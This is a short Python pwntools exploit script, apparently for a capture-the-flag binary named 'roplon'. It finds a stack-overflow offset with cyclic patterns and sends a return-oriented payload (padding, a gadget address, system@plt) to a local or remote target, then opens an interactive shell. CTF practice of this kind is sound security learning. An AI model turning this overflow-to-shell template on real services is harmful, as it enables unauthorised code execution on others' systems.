from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "warn"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./roplon"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b cat_flag
    b do_the_thing
'''

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit(pp):
    offset = 24
    log.info("binary loaded")
    pp.recv()
    payload = flat(
            cyclic(offset),
            0x4011c0,
            elf.plt.system
            )
    pp.sendline(payload)
    print(pp.recv())
    pp.interactive()

elf = context.binary = ELF(binary)
pp = init()
exploit(pp)
